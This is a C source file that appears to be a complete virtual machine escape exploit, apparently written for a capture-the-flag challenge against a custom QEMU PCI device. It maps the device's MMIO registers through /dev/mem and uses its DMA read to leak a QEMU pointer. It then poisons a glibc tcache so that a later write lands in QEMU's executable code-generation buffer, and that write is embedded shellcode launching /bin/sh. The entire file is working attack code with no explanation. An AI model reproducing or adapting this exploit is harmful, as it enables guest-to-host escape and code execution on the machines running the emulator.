#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/types.h>

#define true 1
#define false 0

// Address of the mmio region in physical memory
#define MMIO_PHYSADDR 0xfebf1000
#define MMIO_DELETE_PHYSADDR (MMIO_PHYSADDR + offsetof(struct mmio, delete_req))
#define DMABUF_SIZE 0x1000
#define MMIO_SIZE 0x1000

struct mmio {
    uint32_t size;
    uint32_t addr;
    uint32_t result_addr;
    uint32_t idx;
    uint32_t do_mmio;
    uint32_t create_req;
    uint32_t delete_req;
};

struct tcache {
    uint16_t counts[64];
    uint64_t entries[64];
};

static const uint8_t shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    // launch sh
    0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50,
    0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1,
    0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89,
    0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5,
};

static void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
static uint64_t virt2phys(void* p, int has_to_be_present)
{
    uint64_t virt = (uint64_t)p;
    uint32_t saved_offset = virt & 0xfff;
    virt -= saved_offset;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert((!has_to_be_present) || phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys + saved_offset;
}

static void mmio_read(volatile struct mmio *mmio, uint32_t dmabuf_physaddr,
                      uint32_t idx, uint32_t result_physaddr)
{
    mmio->idx = idx;
    mmio->result_addr = result_physaddr;
    mmio->addr = dmabuf_physaddr;
    uint32_t x = mmio->do_mmio;
}

static void mmio_write(volatile struct mmio *mmio, uint32_t dmabuf_physaddr,
                        uint32_t idx, uint32_t result_physaddr)
{
    mmio->idx = idx;
    mmio->result_addr = result_physaddr;
    mmio->addr = dmabuf_physaddr;
    mmio->do_mmio = 0;
}

static void alloc(volatile struct mmio *mmio, uint32_t size)
{
    mmio->size = size;
    mmio->create_req = 0;
}

int main(void)
{
    // mmio registers
    // int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",
    //              O_RDWR | O_SYNC, 0);
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    assert(fd >= 0);

    volatile struct mmio *mmio = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE,
                                      MAP_SHARED, fd, MMIO_PHYSADDR);
    assert(mmio != MAP_FAILED);

    // Buffer for dma
    volatile uint8_t *dmabuf = mmap(0, DMABUF_SIZE, PROT_READ | PROT_WRITE,
                                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    assert(dmabuf != MAP_FAILED);
    assert(mlock((void *)dmabuf, DMABUF_SIZE) == 0);

    // Make sure that the shellcode is paged in
    assert(mlock((void *)((uint64_t)shellcode & 0xfffffffffffff000),
          MMIO_SIZE) == 0);

    volatile uint64_t *dmabuf64 = (volatile uint64_t *)dmabuf;

    int result = 0;
    uint64_t dmabuf_physaddr = virt2phys((void *)dmabuf, true);
    uint64_t shellcode_physaddr = virt2phys((void*)shellcode, true);
    uint64_t result_physaddr = virt2phys((void*)&result, true);

    // Read the contents of the tcache
    alloc(mmio, 0x400);
    mmio_read(mmio, dmabuf_physaddr, 0, MMIO_DELETE_PHYSADDR);

    // Leak stuff
    uint64_t frame_temp = dmabuf64[98];
    uint64_t qemu_base = frame_temp - 0x110dd80;
    uint64_t pointer_to_rwx = qemu_base + 0x110da60;

    // Prepare a fake tcache
    struct tcache *tcache = (struct tcache *)dmabuf;
    memset(tcache, 0, sizeof(struct tcache));
    tcache->counts[63] = 2;
    tcache->entries[63] = pointer_to_rwx;

    // Overwrite the tcache
    alloc(mmio, 0x400);
    mmio_write(mmio, dmabuf_physaddr, 0, MMIO_DELETE_PHYSADDR);

    // Write the shellcode to the codegen buffer
    alloc(mmio, 0x400);
    mmio_write(mmio, shellcode_physaddr, 0, result_physaddr);

    munmap((void *)dmabuf, DMABUF_SIZE);
    munmap((void *)mmio, MMIO_SIZE);
    close(fd);

    return 0;
}
